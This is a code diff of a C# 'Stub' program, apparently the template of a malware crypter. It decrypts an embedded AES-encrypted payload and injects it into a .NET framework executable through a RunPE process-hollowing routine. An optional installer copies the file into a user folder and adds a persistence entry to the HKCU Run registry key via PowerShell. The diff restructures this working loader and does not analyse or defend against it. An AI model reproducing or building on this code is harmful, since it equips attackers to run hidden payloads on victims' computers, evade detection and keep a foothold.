@@ -1,4 +1,6 @@
-﻿using System;
+﻿//#define install
+
+using System;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -12,29 +14,28 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-
+ 
 namespace Stub
 {
    public class Program
     {
-       public static void Run()
+       public void Run()
         {
-            new Installer()
-            {
-                EnableInstall = @IsInstall,
-                FileName = new FileInfo("#FileName"),
-                DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.@FolderName), "#SecondFolder")),
-                RegistryName = "#RegistryName",
-            }.Run();
+#if install
+            Installer installer = new Installer();
+            installer.Run();
+#endif
+            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), #Injection), AES_Decrypt(GetResource("#Payload")), false);
+            Environment.Exit(0);
         }
 
-        public static byte[] GetResource(string file)
+        public byte[] GetResource(string file)
         {
             ResourceManager ResManager = new ResourceManager("#ParentResource", Assembly.GetExecutingAssembly());
             return (byte[])ResManager.GetObject(file);
         }
 
-        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
+        public byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
         {
             byte[] decryptedBytes = null;
             byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
@@ -61,6 +62,7 @@ namespace Stub
         }
     }
 
+#if install
     #region Installation
     public class Installer
     {
@@ -74,9 +76,9 @@ namespace Stub
          */
 
         public bool EnableInstall { get; set; }
-        public FileInfo FileName { get; set; }
-        public DirectoryInfo DirectoryName { get; set; }
-        public string RegistryName { get; set; }
+        public FileInfo FileName = new FileInfo("#FileName");
+        public DirectoryInfo DirectoryName = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.@FolderName), "#SecondFolder"));
+        public string RegistryName = "#RegistryName";
         public int Sleeping { get; set; }
 
         /// <summary>
@@ -84,7 +86,7 @@ namespace Stub
         /// </summary>
         public void Run()
         {
-            if (EnableInstall && !IsInstalled())
+            if (!IsInstalled())
             {
                 try
                 {
@@ -94,8 +96,6 @@ namespace Stub
                 }
                 catch { }
             }
-            RunPE.Run(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), "#Injection"), Program.AES_Decrypt(Program.GetResource("#Payload")), false);
-            Environment.Exit(0);
         }
 
         /// <summary>
@@ -151,7 +151,7 @@ namespace Stub
         public void InstallRegistry()
         {
             Powershell("Remove-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "';" +
-                "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "' -Value '" + Path.Combine(DirectoryName.FullName, FileName.Name) + "' -PropertyType 'String'");
+                "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" + RegistryName + "' -Value '" + "\"" + Path.Combine(DirectoryName.FullName, FileName.Name) + "\"" + "' -PropertyType 'String'");
         }
 
         public void Powershell(string args)
@@ -169,6 +169,7 @@ namespace Stub
 
     }
     #endregion
+#endif
 
     #region RunPE Class
     public static class RunPE
